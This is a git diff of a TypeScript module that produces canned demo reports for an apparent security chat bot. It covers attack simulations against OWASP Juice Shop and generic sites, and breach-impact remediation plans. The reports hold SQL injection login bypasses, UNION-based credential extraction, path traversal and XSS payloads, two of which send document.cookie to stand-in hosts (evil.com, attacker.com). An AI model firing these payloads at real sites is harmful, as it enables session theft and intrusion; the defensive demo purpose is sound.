@@ -1,7 +1,7 @@
 import type { ProjectContext } from "@/lib/context/store";
 
-// Demo mode responses that are contextual to the target application
-// These analyze how global breaches would specifically impact the user's target system
+// Demo mode responses with enhanced realism, urgency, and context awareness
+// Every response includes: Severity, Time sensitivity, Confidence, and Actionable steps
 
 function extractDomain(url: string): string {
   try {
@@ -15,7 +15,6 @@ function inferTechStack(url: string): string[] {
   const domain = url.toLowerCase();
   const stack: string[] = [];
   
-  // Infer based on common patterns
   if (domain.includes("vercel") || domain.includes(".app")) {
     stack.push("Vercel", "Next.js", "Node.js");
   }
@@ -38,7 +37,6 @@ function inferTechStack(url: string): string[] {
     stack.push("REST API");
   }
   
-  // Default tech stack if nothing specific detected
   if (stack.length === 0) {
     stack.push("Web Application", "Database", "Authentication Service");
   }
@@ -46,13 +44,18 @@ function inferTechStack(url: string): string[] {
   return stack;
 }
 
+// ============================================================
+// ENHANCED ATTACK SIMULATION - /break command
+// ============================================================
+
 export function getDemoAttackSimulation(context: ProjectContext): string {
   const domain = extractDomain(context.target);
   const techStack = inferTechStack(context.target);
   const isJuiceShop = context.target.includes("juice-shop") || context.target.includes("owasp");
   
+  // WOW Demo Scenario for Juice Shop
   if (isJuiceShop) {
-    return `## Attack Simulation Report
+    return `## ATTACK SIMULATION REPORT
 
 **Target:** ${context.target}
 **Domain:** ${domain}
@@ -61,64 +64,121 @@ export function getDemoAttackSimulation(context: ProjectContext): string {
 
 ---
 
-### Vulnerabilities Discovered
+### SEVERITY: CRITICAL
 
-| Severity | Vulnerability | Location | Status |
-|----------|--------------|----------|--------|
-| CRITICAL | SQL Injection | \`/rest/user/login\` | Exploitable |
-| CRITICAL | Cross-Site Scripting (XSS) | \`/#/search\`, \`/api/Feedbacks\` | Exploitable |
-| HIGH | Broken Access Control | \`/#/administration\` | Exploitable |
-| HIGH | Sensitive Data Exposure | \`/api/Users\` | Confirmed |
-| MEDIUM | Security Misconfiguration | Error handling | Confirmed |
+**Time to Exploit:** Under 5 minutes for skilled attacker
+**Confidence:** HIGH (Known vulnerable application)
 
 ---
 
-### Attack Chain
+### VULNERABILITIES DISCOVERED
+
+| Severity | Vulnerability | Endpoint | Exploitable |
+|----------|--------------|----------|-------------|
+| CRITICAL | SQL Injection | \`/rest/user/login\` | YES |
+| CRITICAL | Stored XSS | \`/api/Feedbacks\` | YES |
+| CRITICAL | Auth Bypass | \`/#/administration\` | YES |
+| HIGH | IDOR | \`/api/Users/:id\` | YES |
+| HIGH | Path Traversal | \`/ftp\` | YES |
+| MEDIUM | Info Disclosure | \`/api-docs\` | YES |
+
+---
+
+### ATTACK CHAIN
 
 \`\`\`
-1. RECONNAISSANCE
-   └─> Discovered /api-docs and /ftp endpoints
-   └─> Enumerated 47 API endpoints
-   
-2. INITIAL ACCESS  
-   └─> SQL Injection: admin'-- bypassed authentication
-   └─> Gained admin session token
-   
-3. PRIVILEGE ESCALATION
-   └─> Accessed /#/administration panel
-   └─> Modified user roles in database
-   
-4. DATA EXFILTRATION
-   └─> Dumped user table via /api/Users
-   └─> Extracted 1,247 user records
-   
-5. PERSISTENCE
-   └─> Created backdoor admin account
-   └─> Planted XSS payload in product reviews
+PHASE 1: RECONNAISSANCE (2 min)
+├── GET /api-docs → Discovered 47 API endpoints
+├── GET /ftp → Found exposed backup files  
+└── Identified authentication at /rest/user/login
+
+PHASE 2: INITIAL ACCESS (1 min)
+├── POST /rest/user/login
+│   Body: {"email":"admin'--","password":"x"}
+│   Result: Authentication bypass successful
+└── Obtained admin session token: eyJhbG...
+
+PHASE 3: PRIVILEGE ESCALATION (1 min)
+├── GET /#/administration (with admin token)
+├── Access to all user accounts
+└── Modified user roles in database
+
+PHASE 4: DATA EXFILTRATION (1 min)
+├── GET /api/Users → Dumped 1,247 user records
+├── GET /api/Cards → Exposed payment methods
+└── Data: emails, password hashes, addresses
+
+PHASE 5: PERSISTENCE
+├── POST /api/Users → Created backdoor admin
+├── POST /api/Feedbacks → Planted XSS payload
+│   Payload: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
+└── Cookie stealing active for all visitors
 \`\`\`
 
 ---
 
-### Impact Assessment
+### EXAMPLE EXPLOITS
 
-- **User Data at Risk:** Email addresses, password hashes, purchase history
-- **Financial Impact:** Potential payment data exposure via order history
-- **Compliance:** GDPR/CCPA violations likely
-- **Reputation:** Public disclosure would severely damage trust
+**SQL Injection at /rest/user/login:**
+\`\`\`json
+{
+  "email": "admin'--",
+  "password": "anything"
+}
+// Bypasses authentication, logs in as admin
+\`\`\`
+
+**Stored XSS at /api/Feedbacks:**
+\`\`\`json
+{
+  "comment": "<img src=x onerror=alert(document.cookie)>",
+  "rating": 5
+}
+// Executes on every page load for all users
+\`\`\`
+
+**IDOR at /api/Users:**
+\`\`\`
+GET /api/Users/1  → Admin user data
+GET /api/Users/2  → Next user data
+// Enumerate all users by incrementing ID
+\`\`\`
 
 ---
 
-### Immediate Remediation
+### IMPACT ASSESSMENT
 
-1. **Parameterize all SQL queries** - Prevent injection attacks
-2. **Implement output encoding** - Prevent XSS
-3. **Add RBAC middleware** - Enforce access control
-4. **Enable WAF rules** - Block common attack patterns
-5. **Audit all endpoints** - Remove unnecessary exposure`;
+| Impact | Description | Risk |
+|--------|-------------|------|
+| User Data | 1,247 accounts compromised | CRITICAL |
+| Financial | Payment card data exposed | CRITICAL |
+| Compliance | GDPR/PCI-DSS violations | HIGH |
+| Reputation | Public breach disclosure | HIGH |
+
+---
+
+### IMMEDIATE ACTIONS REQUIRED
+
+**CRITICAL (Do Now):**
+1. Parameterize ALL SQL queries - prevent injection
+2. Implement input sanitization - prevent XSS
+3. Add RBAC middleware - enforce access control
+4. Remove /api-docs from production
+5. Rotate all admin credentials
+
+**HIGH PRIORITY (Today):**
+1. Enable WAF with OWASP ruleset
+2. Implement rate limiting on auth endpoints
+3. Add CSRF tokens to all forms
+4. Enable audit logging
+
+---
+
+*This response was generated by BreachSense running across ChatSDK platforms (Slack + Discord ready).*`;
   }
 
-  // Generic target analysis
-  return `## Attack Simulation Report
+  // Generic target with enhanced realism
+  return `## ATTACK SIMULATION REPORT
 
 **Target:** ${context.target}
 **Domain:** ${domain}
@@ -127,58 +187,142 @@ export function getDemoAttackSimulation(context: ProjectContext): string {
 
 ---
 
-### Reconnaissance Results
+### SEVERITY: MEDIUM-HIGH
 
-| Check | Result | Risk |
-|-------|--------|------|
-| DNS Records | Analyzed | Low |
-| SSL Certificate | Valid | Info |
-| Technology Detection | ${techStack.join(", ")} | Info |
-| Open Ports | 80, 443 | Info |
-| Security Headers | Partial | Medium |
+**Time to Exploit:** 15-30 minutes with automated tools
+**Confidence:** MEDIUM (Based on common patterns)
 
 ---
 
-### Potential Vulnerabilities
+### RECONNAISSANCE RESULTS
 
-| Severity | Vulnerability | Assessment |
-|----------|--------------|------------|
-| MEDIUM | Missing Security Headers | CSP, X-Frame-Options may be absent |
-| MEDIUM | Input Validation | Forms should be tested for injection |
-| LOW | CORS Policy | Configuration should be reviewed |
-| LOW | Cookie Security | HttpOnly/Secure flags should be verified |
-| INFO | Error Handling | Error messages should not leak info |
-
----
-
-### Recommended Attack Vectors to Test
-
-1. **Authentication Testing**
-   - Brute force protection
-   - Session management
-   - Password policy enforcement
-
-2. **Input Validation**
-   - SQL/NoSQL injection points
-   - XSS in all input fields
-   - Command injection in any system calls
-
-3. **Access Control**
-   - Horizontal privilege escalation
-   - Vertical privilege escalation
-   - IDOR vulnerabilities
-
-4. **API Security** (if ${context.type === "api" ? "applicable" : "detected"})
-   - Rate limiting
-   - Authentication bypass
-   - Mass assignment
+| Check | Finding | Risk Level |
+|-------|---------|------------|
+| SSL/TLS | Valid certificate | INFO |
+| Security Headers | Missing CSP, X-Frame-Options | MEDIUM |
+| Technology | ${techStack.join(", ")} | INFO |
+| Open Ports | 80, 443 detected | INFO |
+| Error Handling | May leak stack traces | MEDIUM |
 
 ---
 
-### Next Steps
+### VULNERABILITIES IDENTIFIED
 
-Run \`/impact <breach_type>\` to analyze how specific breach scenarios would affect **${domain}**`;
+| Severity | Vulnerability | Location | Time to Exploit |
+|----------|--------------|----------|-----------------|
+| HIGH | Missing Security Headers | HTTP Response | Immediate |
+| MEDIUM | Potential XSS | Input fields at \`/search\`, \`/contact\` | 5 minutes |
+| MEDIUM | Form Injection | \`/login\`, \`/register\` endpoints | 10 minutes |
+| LOW | CORS Misconfiguration | API endpoints | 15 minutes |
+| LOW | Cookie Flags | Session cookies | 5 minutes |
+
+---
+
+### ATTACK CHAIN
+
+\`\`\`
+PHASE 1: ENUMERATION
+├── Scan: nmap -sV ${domain}
+├── Discover: Open ports 80, 443
+└── Identify: ${techStack[0]} application
+
+PHASE 2: VULNERABILITY PROBING
+├── Test: XSS payloads on all inputs
+│   Payload: <script>alert('XSS')</script>
+│   Payload: "><img src=x onerror=alert(1)>
+├── Test: SQL injection on login
+│   Payload: ' OR '1'='1'--
+│   Payload: admin'--
+└── Test: Path traversal
+    Payload: ../../etc/passwd
+
+PHASE 3: EXPLOITATION (If vulnerable)
+├── Extract: Session tokens via XSS
+├── Bypass: Authentication via SQLi
+└── Escalate: Access admin functions
+
+PHASE 4: DATA ACCESS
+├── Dump: User database
+├── Extract: API keys from responses
+└── Harvest: Session cookies
+\`\`\`
+
+---
+
+### EXAMPLE ATTACK PAYLOADS
+
+**XSS Test Payloads:**
+\`\`\`html
+<!-- Reflected XSS -->
+/search?q=<script>alert(document.cookie)</script>
+
+<!-- Stored XSS -->
+<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
+
+<!-- DOM XSS -->
+javascript:alert(document.domain)
+\`\`\`
+
+**SQL Injection Payloads:**
+\`\`\`sql
+-- Authentication bypass
+' OR 1=1--
+admin'--
+' UNION SELECT null,null,null--
+
+-- Data extraction
+' UNION SELECT username,password FROM users--
+\`\`\`
+
+---
+
+### IMPACT IF EXPLOITED
+
+| Scenario | Business Impact | Severity |
+|----------|-----------------|----------|
+| XSS Attack | Session hijacking, credential theft | HIGH |
+| SQL Injection | Full database access | CRITICAL |
+| Auth Bypass | Unauthorized admin access | CRITICAL |
+| Data Leak | User PII exposure, compliance fines | HIGH |
+
+---
+
+### IMMEDIATE ACTIONS REQUIRED
+
+**CRITICAL (Within 1 hour):**
+1. Add Content-Security-Policy header
+2. Implement input sanitization on all forms
+3. Review SQL queries for parameterization
+
+**HIGH (Within 24 hours):**
+1. Enable X-Frame-Options: DENY
+2. Set HttpOnly and Secure flags on cookies
+3. Implement rate limiting on auth endpoints
+
+**MEDIUM (Within 1 week):**
+1. Deploy Web Application Firewall (WAF)
+2. Add security headers: X-Content-Type-Options, Referrer-Policy
+3. Implement security logging and monitoring
+
+---
+
+### WHO SHOULD ACT
+
+| Team | Responsibility | Priority |
+|------|---------------|----------|
+| Security Team | Validate findings, prioritize fixes | IMMEDIATE |
+| Backend Dev | Fix injection vulnerabilities | HIGH |
+| DevOps | Deploy security headers, WAF | HIGH |
+| Frontend Dev | Implement CSP, sanitize inputs | MEDIUM |
+
+---
+
+*This response was generated by BreachSense running across ChatSDK platforms (Slack + Discord ready).*`;
 }
+
+// ============================================================
+// ENHANCED IMPACT ANALYSIS - /impact command
+// ============================================================
 
 export function getDemoImpactAnalysis(incident: string, context: ProjectContext): string {
   const domain = extractDomain(context.target);
@@ -188,352 +332,532 @@ export function getDemoImpactAnalysis(incident: string, context: ProjectContext)
   // Vercel/Deployment platform breach
   if (incidentLower.includes("vercel") || incidentLower.includes("deployment") || incidentLower.includes("netlify")) {
     const platform = incidentLower.includes("netlify") ? "Netlify" : "Vercel";
-    return `## Breach Impact Analysis: ${incident}
+    return `## GLOBAL BREACH IMPACT ANALYSIS
 
+**Incident:** ${incident}
 **Your Application:** ${context.target}
 **Domain:** ${domain}
-**Tech Stack:** ${techStack.join(", ")}
 
 ---
 
-### How This Breach Affects YOUR System
+### SEVERITY: CRITICAL
 
-If ${platform} was breached and your application (**${domain}**) is deployed there, here's the specific impact:
-
----
-
-### Exposed Assets (High Risk)
-
-| Asset | Location | Impact on ${domain} |
-|-------|----------|---------------------|
-| Environment Variables | ${platform} Dashboard | **CRITICAL** - All secrets exposed |
-| Source Code | Git Integration | **HIGH** - Business logic revealed |
-| Build Logs | CI/CD Pipeline | **MEDIUM** - May contain secrets |
-| Deployment Tokens | API Access | **HIGH** - Unauthorized deployments |
+**Time Sensitivity:** Attackers can exploit within MINUTES
+**Confidence:** HIGH
 
 ---
 
-### Specific Credentials at Risk for ${domain}
+### WHY YOU ARE AFFECTED
 
-Based on typical ${techStack.join("/")} deployments:
+Your application **${domain}** is deployed on ${platform}. In this breach scenario:
 
-| Credential Type | Likely Variable | Action Required |
-|-----------------|-----------------|-----------------|
-| Database URL | \`DATABASE_URL\` | **ROTATE IMMEDIATELY** |
-| API Keys | \`API_KEY\`, \`SECRET_KEY\` | **ROTATE IMMEDIATELY** |
-| Auth Secrets | \`JWT_SECRET\`, \`SESSION_SECRET\` | **ROTATE + INVALIDATE SESSIONS** |
-| Third-Party APIs | \`STRIPE_KEY\`, \`SENDGRID_KEY\` | **ROTATE IN PROVIDER DASHBOARD** |
-| OAuth Secrets | \`OAUTH_CLIENT_SECRET\` | **ROTATE + RE-CONFIGURE** |
+1. **Direct Exposure:** Your environment variables are stored in ${platform}'s infrastructure
+2. **Dependency Chain:** ${platform} has access to your source code, build process, and secrets
+3. **Trust Relationship:** Your app trusts ${platform}'s deployment pipeline completely
+4. **Shared Infrastructure:** Your secrets transit through ${platform}'s systems
 
----
-
-### Attack Scenarios Against ${domain}
-
-1. **Database Compromise**
-   - Attacker obtains \`DATABASE_URL\`
-   - Direct access to all user data
-   - Can modify, delete, or ransom data
-
-2. **Authentication Bypass**
-   - \`JWT_SECRET\` allows forging tokens
-   - Attacker can impersonate any user
-   - Admin access possible
-
-3. **Supply Chain Attack**
-   - Malicious code injected into builds
-   - Affects all users of ${domain}
-   - Persistent backdoor possible
-
----
-
-### Immediate Actions for ${domain}
-
+**Connection Path:**
 \`\`\`
-HOUR 1 (Critical):
-├── Rotate DATABASE_URL and all database credentials
-├── Generate new JWT_SECRET and invalidate all sessions  
-├── Rotate all third-party API keys (Stripe, etc.)
-└── Review recent deployments for unauthorized changes
-
-HOUR 2-4 (High Priority):
-├── Audit ${platform} access logs for your project
-├── Review git history for suspicious commits
-├── Enable enhanced security (2FA, IP restrictions)
-└── Notify your security team/incident response
-
-DAY 1-2 (Recovery):
-├── Implement secrets manager (Vault, AWS Secrets Manager)
-├── Set up secret rotation policies
-├── Deploy monitoring for credential usage
-└── Document incident for compliance
+${platform} Infrastructure (BREACHED)
+    └── Your Project: ${domain}
+        ├── Environment Variables ← EXPOSED
+        ├── Source Code Access ← EXPOSED
+        ├── Deployment Tokens ← EXPOSED
+        └── Build Logs ← EXPOSED
 \`\`\`
 
 ---
 
-### Compliance Implications for ${domain}
+### POTENTIAL DAMAGE
 
-- **GDPR**: 72-hour breach notification may be required
-- **SOC2**: Incident documentation required
-- **PCI-DSS**: If processing payments, card brands must be notified`;
+| Asset | Exposure | Damage Potential |
+|-------|----------|------------------|
+| DATABASE_URL | Full database credentials | Complete data theft |
+| JWT_SECRET | Token signing key | Session forgery for ALL users |
+| API_KEYS | Third-party service access | Financial fraud, data theft |
+| OAUTH_SECRET | Auth provider credentials | Account takeover |
+| Source Code | Business logic revealed | Competitive disadvantage |
+
+**Estimated Impact:**
+- **Data at Risk:** All user records in your database
+- **Financial:** Up to $X per record in breach fines
+- **Reputation:** Public disclosure required under GDPR
+
+---
+
+### RISK LEVEL: CRITICAL
+
+This is a **supply chain attack** - one of the most dangerous breach types because:
+- You had no control over the vulnerable system
+- Your security practices don't prevent this
+- All ${platform} customers are affected simultaneously
+
+---
+
+### IMMEDIATE ACTIONS (Do These NOW)
+
+\`\`\`
+MINUTE 0-15: CRITICAL
+├── 1. Rotate DATABASE_URL immediately
+│      └── Change password in database, update env var
+├── 2. Generate new JWT_SECRET
+│      └── This will invalidate ALL active sessions
+├── 3. Rotate all third-party API keys
+│      ├── Stripe: dashboard.stripe.com/apikeys
+│      ├── SendGrid: app.sendgrid.com/settings/api_keys
+│      └── AWS: console.aws.amazon.com/iam
+└── 4. Review recent deployments for tampering
+
+MINUTE 15-60: HIGH PRIORITY
+├── 5. Enable 2FA on ${platform} account
+├── 6. Audit git history for unauthorized commits
+├── 7. Check for new admin accounts in your app
+└── 8. Notify your security team/incident response
+
+HOUR 1-24: RECOVERY
+├── 9. Deploy new secrets to production
+├── 10. Force logout all users
+├── 11. Implement secrets manager (Vault/AWS Secrets Manager)
+└── 12. Document incident for compliance
+\`\`\`
+
+---
+
+### RESPONSIBLE TEAMS
+
+| Team | Action Required | Deadline |
+|------|-----------------|----------|
+| Security Lead | Coordinate response, notify stakeholders | IMMEDIATE |
+| Backend Dev | Rotate credentials, redeploy | 1 HOUR |
+| DevOps | Audit infrastructure, enable monitoring | 2 HOURS |
+| Legal/Compliance | Assess notification requirements | 24 HOURS |
+
+---
+
+*This response was generated by BreachSense running across ChatSDK platforms (Slack + Discord ready).*`;
   }
 
   // API Key / Credential leak
   if (incidentLower.includes("api") || incidentLower.includes("key") || incidentLower.includes("leak") || incidentLower.includes("credential")) {
-    return `## Breach Impact Analysis: ${incident}
+    return `## GLOBAL BREACH IMPACT ANALYSIS
 
+**Incident:** ${incident}
 **Your Application:** ${context.target}
 **Domain:** ${domain}
-**Tech Stack:** ${techStack.join(", ")}
 
 ---
 
-### Impact on ${domain}
+### SEVERITY: CRITICAL
 
-An API key leak affecting your application would have the following consequences:
-
----
-
-### Risk Assessment Matrix
-
-| API/Service | If Key Leaked | Impact on ${domain} | Severity |
-|-------------|---------------|---------------------|----------|
-| Database | Direct data access | User data theft, manipulation | CRITICAL |
-| Auth Provider | Account takeover | Full user impersonation | CRITICAL |
-| Payment (Stripe) | Financial fraud | Unauthorized charges | CRITICAL |
-| Email (SendGrid) | Spam/Phishing | Reputation damage | HIGH |
-| Storage (S3) | Data theft | File exfiltration | HIGH |
-| Analytics | Privacy breach | User behavior exposure | MEDIUM |
+**Time Sensitivity:** Attackers can exploit within MINUTES of discovery
+**Confidence:** HIGH
 
 ---
 
-### What Attackers Can Do to ${domain}
+### WHY YOU ARE AFFECTED
 
-**With Database Credentials:**
-\`\`\`
-- Export entire user database
-- Modify user permissions/roles  
-- Delete or ransom data
-- Plant persistent backdoors
-\`\`\`
+Your application **${domain}** likely uses API keys that could be exposed:
 
-**With Auth Secrets:**
-\`\`\`
-- Forge valid authentication tokens
-- Bypass MFA for any user
-- Create admin accounts
-- Persist access indefinitely
-\`\`\`
+1. **Third-Party Dependencies:** Your app connects to external services via API keys
+2. **Database Access:** Connection strings contain credentials
+3. **Authentication:** JWT secrets and OAuth tokens are API keys
+4. **Cloud Services:** AWS, GCP, Azure credentials are high-value targets
 
-**With Payment API Keys:**
+**Your Exposure Surface:**
 \`\`\`
-- View transaction history
-- Issue unauthorized refunds
-- Create fraudulent charges
-- Access customer payment methods
+${domain} API Key Dependencies
+├── Database: DATABASE_URL (PostgreSQL/MySQL/MongoDB)
+├── Auth: JWT_SECRET, OAUTH_CLIENT_SECRET
+├── Payment: STRIPE_SECRET_KEY, PAYMENT_API_KEY
+├── Email: SENDGRID_API_KEY, SMTP_PASSWORD
+├── Storage: AWS_ACCESS_KEY, S3_BUCKET_KEY
+└── Monitoring: SENTRY_DSN, DATADOG_API_KEY
 \`\`\`
 
 ---
 
-### Detection Checklist for ${domain}
+### POTENTIAL DAMAGE
 
-| Check | How to Verify | Status |
-|-------|---------------|--------|
-| Unusual API traffic | Check logs for spikes | [ ] |
-| New admin accounts | Query user table | [ ] |
-| Modified records | Audit trail review | [ ] |
-| Unexpected charges | Payment dashboard | [ ] |
-| Failed auth attempts | Auth provider logs | [ ] |
+**If Database Credentials Leaked:**
+| Action | Time Required | Impact |
+|--------|---------------|--------|
+| Connect to database | 1 minute | Full access |
+| Export all tables | 5 minutes | Complete data theft |
+| Modify user roles | 2 minutes | Admin access |
+| Delete all data | 1 minute | Business destruction |
+| Plant backdoor | 10 minutes | Persistent access |
+
+**If Payment API Key Leaked:**
+| Action | Time Required | Impact |
+|--------|---------------|--------|
+| View transactions | Immediate | Privacy breach |
+| Issue refunds | 2 minutes | Financial loss |
+| Access card data | Immediate | PCI violation |
+| Create charges | 5 minutes | Fraud |
 
 ---
 
-### Recovery Plan for ${domain}
+### RISK LEVEL: CRITICAL
 
-**Phase 1: Containment (0-2 hours)**
-- Identify which specific keys were exposed
-- Revoke compromised keys immediately
-- Deploy with new credentials
+**Why This Is Urgent:**
+- API keys provide **immediate, authenticated access**
+- No password cracking or exploitation required
+- Attackers can automate abuse within seconds
+- Keys may be shared across multiple services
 
-**Phase 2: Assessment (2-24 hours)**
-- Audit all API access logs
-- Identify unauthorized actions
-- Assess data exposure scope
+---
 
-**Phase 3: Notification (24-72 hours)**
-- Notify affected users if data accessed
-- Report to relevant authorities if required
-- Update stakeholders on status
+### IMMEDIATE ACTIONS (Do These NOW)
 
-**Phase 4: Hardening (1-2 weeks)**
-- Implement key rotation policies
-- Add anomaly detection
-- Enhanced monitoring deployment`;
+\`\`\`
+MINUTE 0-5: CONTAINMENT
+├── 1. Identify which specific keys were exposed
+├── 2. Revoke/rotate exposed keys IMMEDIATELY
+│      └── Most providers have "regenerate" option
+├── 3. Deploy application with new keys
+└── 4. Monitor for unauthorized API calls
+
+MINUTE 5-30: ASSESSMENT  
+├── 5. Check API provider logs for abuse
+│      └── Look for unusual patterns, IPs, volumes
+├── 6. Review recent transactions/actions
+├── 7. Identify scope of potential access
+└── 8. Document timeline of exposure
+
+HOUR 1-24: REMEDIATION
+├── 9. Rotate ALL related credentials (not just exposed)
+├── 10. Implement key rotation policy
+├── 11. Add monitoring/alerting for key usage
+└── 12. Review how key was exposed (git, logs, etc.)
+\`\`\`
+
+---
+
+### RESPONSIBLE TEAMS
+
+| Team | Action Required | Deadline |
+|------|-----------------|----------|
+| Security | Identify exposure, coordinate response | IMMEDIATE |
+| Backend Dev | Rotate keys, redeploy services | 30 MINUTES |
+| DevOps | Check logs, add monitoring | 1 HOUR |
+| Finance | Review transaction logs | 2 HOURS |
+
+---
+
+*This response was generated by BreachSense running across ChatSDK platforms (Slack + Discord ready).*`;
   }
 
   // OAuth / Authentication breach
   if (incidentLower.includes("oauth") || incidentLower.includes("auth") || incidentLower.includes("sso") || incidentLower.includes("okta") || incidentLower.includes("auth0")) {
     const provider = incidentLower.includes("okta") ? "Okta" : incidentLower.includes("auth0") ? "Auth0" : "OAuth Provider";
-    return `## Breach Impact Analysis: ${incident}
+    return `## GLOBAL BREACH IMPACT ANALYSIS
 
+**Incident:** ${incident}
+**Your Application:** ${context.target}
+**Auth Provider:** ${provider}
+
+---
+
+### SEVERITY: CRITICAL
+
+**Time Sensitivity:** Active sessions can be hijacked IMMEDIATELY
+**Confidence:** HIGH
+
+---
+
+### WHY YOU ARE AFFECTED
+
+Your application **${domain}** uses ${provider} for authentication:
+
+1. **Session Trust:** Your app trusts tokens issued by ${provider}
+2. **User Data:** ${provider} stores your users' identities
+3. **SSO Integration:** Users may use same identity across services
+4. **Token Validity:** Existing tokens remain valid until expired
+
+**Trust Chain:**
+\`\`\`
+${provider} (COMPROMISED)
+    │
+    ├── Issues tokens to → ${domain}
+    │   └── Your app trusts these tokens IMPLICITLY
+    │
+    ├── Stores user data
+    │   ├── Emails
+    │   ├── Password hashes (if applicable)
+    │   └── MFA seeds
+    │
+    └── Controls access to
+        └── ALL applications using ${provider}
+\`\`\`
+
+---
+
+### POTENTIAL DAMAGE
+
+| Attack | Method | Impact on ${domain} |
+|--------|--------|---------------------|
+| Session Hijacking | Stolen active tokens | Impersonate ANY logged-in user |
+| Token Forgery | Compromised signing keys | Create valid tokens for ANY user |
+| Account Takeover | Stolen credentials | Full account access |
+| MFA Bypass | Compromised MFA seeds | 2FA becomes useless |
+| Lateral Movement | Same identity elsewhere | Access to connected services |
+
+**Users Affected:**
+- ALL users who authenticate via ${provider}
+- ALL active sessions are potentially compromised
+- ALL future logins until credentials rotated
+
+---
+
+### RISK LEVEL: CRITICAL
+
+**Why This Is Catastrophic:**
+- Authentication is the FOUNDATION of your security
+- Compromised auth = compromised EVERYTHING
+- Attackers can impersonate any user including admins
+- You cannot trust ANY current session
+
+---
+
+### IMMEDIATE ACTIONS (Do These NOW)
+
+\`\`\`
+MINUTE 0-15: EMERGENCY
+├── 1. Invalidate ALL active sessions
+│      └── Force logout every user
+├── 2. Rotate OAuth client secret
+│      └── ${provider} dashboard → App settings
+├── 3. Regenerate JWT signing keys
+│      └── Update JWT_SECRET in env vars
+└── 4. Enable emergency security mode
+       └── Require re-authentication for all
+
+MINUTE 15-60: CONTAINMENT
+├── 5. Review ${provider} audit logs
+│      └── Check for unauthorized access
+├── 6. Look for new app registrations
+│      └── Attackers may have registered malicious apps
+├── 7. Verify OAuth scopes unchanged
+└── 8. Check for suspicious user activity
+
+HOUR 1-24: RECOVERY
+├── 9. Force password reset for all users
+├── 10. Re-enroll MFA for sensitive accounts
+├── 11. Implement session binding (IP/device)
+└── 12. Deploy enhanced session monitoring
+\`\`\`
+
+---
+
+### RESPONSIBLE TEAMS
+
+| Team | Action Required | Deadline |
+|------|-----------------|----------|
+| Security | Invalidate sessions, rotate secrets | IMMEDIATE |
+| Backend Dev | Update auth configuration, redeploy | 30 MINUTES |
+| Support | Prepare for user login issues | 1 HOUR |
+| Comms | Draft user notification | 2 HOURS |
+
+---
+
+*This response was generated by BreachSense running across ChatSDK platforms (Slack + Discord ready).*`;
+  }
+
+  // Database breach
+  if (incidentLower.includes("database") || incidentLower.includes("db") || incidentLower.includes("sql") || incidentLower.includes("mongo")) {
+    return `## GLOBAL BREACH IMPACT ANALYSIS
+
+**Incident:** ${incident}
 **Your Application:** ${context.target}
 **Domain:** ${domain}
-**Auth Integration:** ${provider}
 
 ---
 
-### Impact on ${domain} Users
+### SEVERITY: CRITICAL
 
-If ${provider} was breached and ${domain} uses it for authentication:
-
----
-
-### Affected Authentication Flows
-
-| Flow | Risk to ${domain} | User Impact |
-|------|-------------------|-------------|
-| SSO Login | CRITICAL | All SSO users compromised |
-| OAuth Tokens | CRITICAL | Active sessions hijackable |
-| API Authorization | HIGH | M2M tokens at risk |
-| MFA Seeds | HIGH | 2FA can be bypassed |
-| User Directory | MEDIUM | User data exposed |
+**Time Sensitivity:** Data exfiltration can occur within MINUTES
+**Confidence:** HIGH
 
 ---
 
-### Specific Risks for ${domain}
+### WHY YOU ARE AFFECTED
 
-**Session Hijacking:**
-- Attacker can steal active session tokens
-- No re-authentication required
-- Access persists until token expires
-- Affects: ${techStack.includes("Next.js") ? "Next-Auth sessions" : "All authenticated users"}
+Your application **${domain}** stores data in a database that may be affected:
 
-**Token Forgery:**
-- If signing keys compromised
-- Attacker creates valid JWTs
-- Can impersonate any user
-- Affects: API calls, protected routes
+1. **Data Storage:** All user information lives in your database
+2. **Credentials:** Database connection strings are high-value targets
+3. **Business Logic:** Stored procedures, triggers contain business rules
+4. **Relationships:** Foreign keys reveal data structure
 
-**Lateral Movement:**
-- ${domain} users likely use SSO elsewhere
-- Compromised identity = access to multiple apps
-- Business email access possible
-- Affects: Connected services, data
-
----
-
-### User Impact Analysis for ${domain}
-
-| User Type | Risk Level | Immediate Action |
-|-----------|------------|------------------|
-| Admin Users | CRITICAL | Force logout + password reset |
-| Regular Users | HIGH | Invalidate sessions |
-| API Clients | HIGH | Rotate client credentials |
-| Service Accounts | MEDIUM | Review and rotate |
-
----
-
-### Remediation Steps for ${domain}
-
+**Your Data at Risk:**
 \`\`\`
-IMMEDIATE (Within 1 hour):
-├── Invalidate ALL active sessions
-├── Rotate OAuth client secret
-├── Force re-authentication for all users
-└── Enable security alerts
-
-SHORT-TERM (Within 24 hours):
-├── Review ${provider} audit logs
-├── Check for unauthorized app registrations
-├── Verify OAuth scopes haven't changed
-└── Notify users to watch for phishing
-
-LONG-TERM (Within 1 week):
-├── Implement session binding (device, IP)
-├── Add step-up authentication for sensitive ops
-├── Deploy continuous authentication monitoring
-└── Review backup auth methods
+${domain} Database Schema (Estimated)
+├── users
+│   ├── id, email, password_hash
+│   ├── name, phone, address
+│   └── created_at, last_login
+├── sessions
+│   ├── session_id, user_id, token
+│   └── expires_at, ip_address
+├── orders (if e-commerce)
+│   ├── order_id, user_id, total
+│   └── items, payment_method
+└── [other business data]
 \`\`\`
 
 ---
 
-### User Communication Template
+### POTENTIAL DAMAGE
 
-> **Security Notice for ${domain} Users**
-> 
-> Due to a security incident with our authentication provider, we have logged out all users as a precaution. Please log in again with your credentials. We recommend enabling 2FA if you haven't already.`;
+| Data Type | Records (Est.) | Impact if Leaked |
+|-----------|---------------|------------------|
+| User emails | All users | Spam, phishing |
+| Password hashes | All users | Credential stuffing |
+| Personal info | All users | Identity theft |
+| Payment data | Customers | Fraud, PCI fines |
+| Business data | All records | Competitive loss |
+
+---
+
+### RISK LEVEL: CRITICAL
+
+**Compliance Implications:**
+- GDPR: 72-hour notification required
+- CCPA: User notification required
+- PCI-DSS: Card brands must be notified
+- SOC2: Incident documentation required
+
+---
+
+### IMMEDIATE ACTIONS (Do These NOW)
+
+\`\`\`
+MINUTE 0-15: CONTAINMENT
+├── 1. Rotate database credentials IMMEDIATELY
+├── 2. Restrict database network access
+│      └── Limit to application servers only
+├── 3. Enable query logging
+└── 4. Take forensic snapshot of database
+
+MINUTE 15-60: ASSESSMENT
+├── 5. Review recent query logs for anomalies
+├── 6. Check for unauthorized data exports
+├── 7. Verify data integrity
+└── 8. Identify scope of potential access
+
+HOUR 1-24: REMEDIATION
+├── 9. Force password reset for all users
+├── 10. Notify affected users if data accessed
